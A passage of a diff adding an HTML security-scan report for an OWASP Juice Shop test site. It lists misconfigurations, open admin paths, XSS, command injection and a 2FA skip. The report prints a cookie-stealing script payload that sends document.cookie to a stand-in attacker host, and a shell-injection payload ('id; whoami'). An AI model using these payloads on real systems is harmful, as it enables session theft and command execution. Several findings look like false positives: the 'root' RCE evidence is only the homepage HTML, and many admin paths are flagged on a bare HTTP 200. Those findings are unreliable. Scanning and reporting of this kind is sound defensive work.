+              https://storage.googleapis.com/juiceshoptest
+            </td>
+            <td>
+              
+              0.0
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:0%;
+                            background:var(--low);">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">GCP</span></td>
+          </tr>
+          
+          <tr>
+            <td>33</td>
+            <td>
+              <span class="badge badge-info">INFO</span>
+            </td>
+            <td>Infrastructure</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/
+            </td>
+            <td>
+              
+              0.0
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:0%;
+                            background:var(--low);">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">Infrastructure</span></td>
+          </tr>
+          
+          <tr>
+            <td>34</td>
+            <td>
+              <span class="badge badge-info">INFO</span>
+            </td>
+            <td>IP Prefixes</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/
+            </td>
+            <td>
+              
+              0.0
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:0%;
+                            background:var(--low);">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">IP</span></td>
+          </tr>
+          
+          <tr>
+            <td>35</td>
+            <td>
+              <span class="badge badge-info">INFO</span>
+            </td>
+            <td>Exposed Sensitive Path</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/api-docs
+            </td>
+            <td>
+              
+              0.0
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:0%;
+                            background:var(--low);">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">Exposed</span></td>
+          </tr>
+          
+          <tr>
+            <td>36</td>
+            <td>
+              <span class="badge badge-info">INFO</span>
+            </td>
+            <td>Exposed Sensitive Path</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/media
+            </td>
+            <td>
+              
+              0.0
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:0%;
+                            background:var(--low);">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">Exposed</span></td>
+          </tr>
+          
+          <tr>
+            <td>37</td>
+            <td>
+              <span class="badge badge-info">INFO</span>
+            </td>
+            <td>Exposed Sensitive Path</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/assets
+            </td>
+            <td>
+              
+              0.0
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:0%;
+                            background:var(--low);">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">Exposed</span></td>
+          </tr>
+          
+          <tr>
+            <td>38</td>
+            <td>
+              <span class="badge badge-info">INFO</span>
+            </td>
+            <td>Exposed Sensitive Path</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/api/
+            </td>
+            <td>
+              
+              0.0
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:0%;
+                            background:var(--low);">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">Exposed</span></td>
+          </tr>
+          
+          <tr>
+            <td>39</td>
+            <td>
+              <span class="badge badge-info">INFO</span>
+            </td>
+            <td>Exposed Sensitive Path</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/api/v2/
+            </td>
+            <td>
+              
+              0.0
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:0%;
+                            background:var(--low);">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">Exposed</span></td>
+          </tr>
+          
+          <tr>
+            <td>40</td>
+            <td>
+              <span class="badge badge-info">INFO</span>
+            </td>
+            <td>Exposed Sensitive Path</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/rest
+            </td>
+            <td>
+              
+              0.0
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:0%;
+                            background:var(--low);">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">Exposed</span></td>
+          </tr>
+          
+          <tr>
+            <td>41</td>
+            <td>
+              <span class="badge badge-info">INFO</span>
+            </td>
+            <td>Exposed Sensitive Path</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/api/v1
+            </td>
+            <td>
+              
+              0.0
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:0%;
+                            background:var(--low);">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">Exposed</span></td>
+          </tr>
+          
+          <tr>
+            <td>42</td>
+            <td>
+              <span class="badge badge-info">INFO</span>
+            </td>
+            <td>Exposed Sensitive Path</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/profile
+            </td>
+            <td>
+              
+              0.0
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:0%;
+                            background:var(--low);">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">Exposed</span></td>
+          </tr>
+          
+          <tr>
+            <td>43</td>
+            <td>
+              <span class="badge badge-info">INFO</span>
+            </td>
+            <td>Exposed Sensitive Path</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/api/v3
+            </td>
+            <td>
+              
+              0.0
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:0%;
+                            background:var(--low);">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">Exposed</span></td>
+          </tr>
+          
+          <tr>
+            <td>44</td>
+            <td>
+              <span class="badge badge-info">INFO</span>
+            </td>
+            <td>Exposed Sensitive Path</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/api/v1/
+            </td>
+            <td>
+              
+              0.0
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:0%;
+                            background:var(--low);">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">Exposed</span></td>
+          </tr>
+          
+          <tr>
+            <td>45</td>
+            <td>
+              <span class="badge badge-info">INFO</span>
+            </td>
+            <td>Exposed Sensitive Path</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/api
+            </td>
+            <td>
+              
+              0.0
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:0%;
+                            background:var(--low);">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">Exposed</span></td>
+          </tr>
+          
+          <tr>
+            <td>46</td>
+            <td>
+              <span class="badge badge-info">INFO</span>
+            </td>
+            <td>Exposed Sensitive Path</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io/api/v2
+            </td>
+            <td>
+              
+              0.0
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:0%;
+                            background:var(--low);">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">Exposed</span></td>
+          </tr>
+          
+          <tr>
+            <td>47</td>
+            <td>
+              <span class="badge badge-info">INFO</span>
+            </td>
+            <td>Missing Header: Permissions-Policy</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io
+            </td>
+            <td>
+              
+              2.0
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:20%;
+                            background:var(--low);">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">Header Check</span></td>
+          </tr>
+          
+          <tr>
+            <td>48</td>
+            <td>
+              <span class="badge badge-info">INFO</span>
+            </td>
+            <td>Missing Header: Cross-Origin-Opener-Policy</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io
+            </td>
+            <td>
+              
+              2.0
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:20%;
+                            background:var(--low);">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">Header Check</span></td>
+          </tr>
+          
+          <tr>
+            <td>49</td>
+            <td>
+              <span class="badge badge-info">INFO</span>
+            </td>
+            <td>Missing Header: Cross-Origin-Resource-Policy</td>
+            <td style="max-width:220px; word-break:break-all; font-size:12px; font-family:'JetBrains Mono',monospace;">
+              https://juiceshop.akto.io
+            </td>
+            <td>
+              
+              2.0
+              <div class="cvss-bar-wrap">
+                <div class="cvss-bar"
+                     style="width:20%;
+                            background:var(--low);">
+                </div>
+              </div>
+            </td>
+            <td style="font-size:11px; color:var(--muted);">A05:2021 – Security Misconfiguration</td>
+            <td><span class="module-tag">Header Check</span></td>
+          </tr>
+          
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- ── DETAILED FINDINGS ── -->
+  <div class="section">
+    <div class="section-title">Detailed Findings</div>
+
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-critical" style="margin-right:10px;">CRITICAL</span>
+          <span class="finding-title">Admin Dashboard — No Authentication Required</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#1 | CVSS 9.8</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/admin</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Admin dashboard at https://juiceshop.akto.io/admin is directly accessible without login</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A01:2021 – Broken Access Control</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Admin</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">HTTP 200 | Dashboard indicators present without authentication</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              High risk of system compromise. Attackers could potentially gain unauthorized access, escalate privileges, or extract sensitive data.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Enforce authentication Senior ware on all admin routes. Use IP allowlisting for admin access if possible.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-critical" style="margin-right:10px;">CRITICAL</span>
+          <span class="finding-title">Admin Dashboard — No Authentication Required</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#2 | CVSS 9.8</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/administrator</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Admin dashboard at https://juiceshop.akto.io/administrator is directly accessible without login</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A01:2021 – Broken Access Control</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Admin</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">HTTP 200 | Dashboard indicators present without authentication</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              High risk of system compromise. Attackers could potentially gain unauthorized access, escalate privileges, or extract sensitive data.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Enforce authentication Senior ware on all admin routes. Use IP allowlisting for admin access if possible.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-critical" style="margin-right:10px;">CRITICAL</span>
+          <span class="finding-title">Admin Dashboard — No Authentication Required</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#3 | CVSS 9.8</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/dashboard</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Admin dashboard at https://juiceshop.akto.io/dashboard is directly accessible without login</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A01:2021 – Broken Access Control</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Admin</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">HTTP 200 | Dashboard indicators present without authentication</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              High risk of system compromise. Attackers could potentially gain unauthorized access, escalate privileges, or extract sensitive data.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Enforce authentication Senior ware on all admin routes. Use IP allowlisting for admin access if possible.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-critical" style="margin-right:10px;">CRITICAL</span>
+          <span class="finding-title">Admin Dashboard — No Authentication Required</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#4 | CVSS 9.8</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/wp-admin</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Admin dashboard at https://juiceshop.akto.io/wp-admin is directly accessible without login</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A01:2021 – Broken Access Control</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Admin</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">HTTP 200 | Dashboard indicators present without authentication</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              High risk of system compromise. Attackers could potentially gain unauthorized access, escalate privileges, or extract sensitive data.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Enforce authentication Senior ware on all admin routes. Use IP allowlisting for admin access if possible.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-critical" style="margin-right:10px;">CRITICAL</span>
+          <span class="finding-title">Admin Dashboard — No Authentication Required</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#5 | CVSS 9.8</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/manager</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Admin dashboard at https://juiceshop.akto.io/manager is directly accessible without login</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A01:2021 – Broken Access Control</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Admin</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">HTTP 200 | Dashboard indicators present without authentication</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              High risk of system compromise. Attackers could potentially gain unauthorized access, escalate privileges, or extract sensitive data.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Enforce authentication Senior ware on all admin routes. Use IP allowlisting for admin access if possible.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-critical" style="margin-right:10px;">CRITICAL</span>
+          <span class="finding-title">Admin Dashboard — No Authentication Required</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#6 | CVSS 9.8</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/cpanel</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Admin dashboard at https://juiceshop.akto.io/cpanel is directly accessible without login</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A01:2021 – Broken Access Control</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">Admin</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">HTTP 200 | Dashboard indicators present without authentication</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              High risk of system compromise. Attackers could potentially gain unauthorized access, escalate privileges, or extract sensitive data.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Enforce authentication Senior ware on all admin routes. Use IP allowlisting for admin access if possible.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-critical" style="margin-right:10px;">CRITICAL</span>
+          <span class="finding-title">XSS — Session Hijack Payload (Generated)</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#7 | CVSS 9.3</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">XSS confirmed in &#39;q&#39;. Cookie-stealing payload generated. Attacker can capture session tokens of authenticated users.</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A03:2021 – Injection</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">XSS</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">🔍 View Payload & Parameter</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--accent); margin-top: 8px;">
+              <strong>Parameter:</strong> <code>q</code><br><br>
+              
+            </div>
+          </details>
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">Payload: &lt;script&gt;fetch(&#39;https://attacker.invalid/steal?c=&#39;+document.cookie);&lt;/script&gt;</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              High risk of system compromise. Attackers could potentially gain unauthorized access, escalate privileges, or extract sensitive data.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              Implement strict CSP. Sanitize all output. Set HttpOnly + Secure flags on all session cookies.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-critical" style="margin-right:10px;">CRITICAL</span>
+          <span class="finding-title">RCE — Remote Code Execution (Exploited)</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#8 | CVSS 10.0</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Command &#39;id; whoami&#39; executed. Output detected: &#39;root&#39;</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A03:2021 – Injection</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">RCE</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">🔍 View Payload & Parameter</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--accent); margin-top: 8px;">
+              <strong>Parameter:</strong> <code>cmd</code><br><br>
+              <strong>Payload:</strong> <div class="code-block" style="margin-top:5px;">valid_input;id; whoami</div>
+            </div>
+          </details>
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">&lt;!--
+  ~ Copyright (c) 2014-2026 Bjoern Kimminich &amp; the OWASP Juice Shop contributors.
+  ~ SPDX-License-Identifier: MIT
+  --&gt;
+
+&lt;!doctype html&gt;
+&lt;html lang=&#34;en&#34; data-beasties-container&gt;
+&lt;head&gt;
+  &lt;meta charset=&#34;utf-8&#34;&gt;
+  &lt;title&gt;OWASP Juice Shop&lt;/title&gt;
+  &lt;meta name=&#34;description&#34; content=&#34;Probably the most modern and sophisticated insecure web application&#34;&gt;
+  &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt;
+  &lt;link id=&#34;favicon&#34; rel=&#34;icon&#34; type=&#34;image/x-icon&#34; href=&#34;assets/public/f</div>
+            </div>
+          </details>
+          
+
+          <details class="report-details" open style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--high);">⚠️ Senior Pentester Analysis (Impact)</summary>
+            <div style="padding: 10px; background: rgba(255,140,0,0.1); border-left: 3px solid var(--high); margin-top: 8px; color: #ffaa44;">
+              High risk of system compromise. Attackers could potentially gain unauthorized access, escalate privileges, or extract sensitive data.
+            </div>
+          </details>
+
+          <details class="report-details" open style="cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--low);">✅ Strategic Remediation</summary>
+            <div class="remediation-box" style="margin-top: 8px;">
+              CRITICAL: Sanitize all shell inputs. Use subprocess with argument lists. Restrict OS command access from web layer.
+            </div>
+          </details>
+          
+        </div>
+      </div>
+    </div>
+    
+    <div class="finding-card">
+      <div class="finding-header">
+        <div>
+          <span class="badge badge-critical" style="margin-right:10px;">CRITICAL</span>
+          <span class="finding-title">2FA — Step Skip (Direct URL Access)</span>
+        </div>
+        <span style="font-size:12px; color:var(--muted);">#9 | CVSS 9.1</span>
+      </div>
+      <div class="finding-body">
+        <div class="detail-grid">
+          <span class="detail-label">Location</span>
+          <span class="detail-value">
+            <div class="code-block">https://juiceshop.akto.io/dashboard</div>
+          </span>
+
+          <span class="detail-label">Description</span>
+          <span class="detail-value">Protected page &#39;/dashboard&#39; accessible without 2FA completion.</span>
+
+          <span class="detail-label">OWASP</span>
+          <span class="detail-value" style="color:var(--accent);">A01:2021 – Broken Access Control</span>
+
+          <span class="detail-label">Module</span>
+          <span class="detail-value"><span class="module-tag">2FA</span></span>
+        </div>
+
+        <!-- Clickable Technical Details -->
+        <div style="margin-top: 15px;">
+          
+          
+
+          
+          <details class="report-details" style="margin-bottom: 10px; cursor: pointer;">
+            <summary style="font-weight: bold; color: var(--accent);">📄 View Evidence / Response</summary>
+            <div style="padding: 10px; background: rgba(0,0,0,0.2); border-left: 3px solid var(--high); margin-top: 8px;">
+              <div class="code-block">HTTP 200 on /dashboard without 2FA session</div>
+            </div>
+          </details>
+          
+
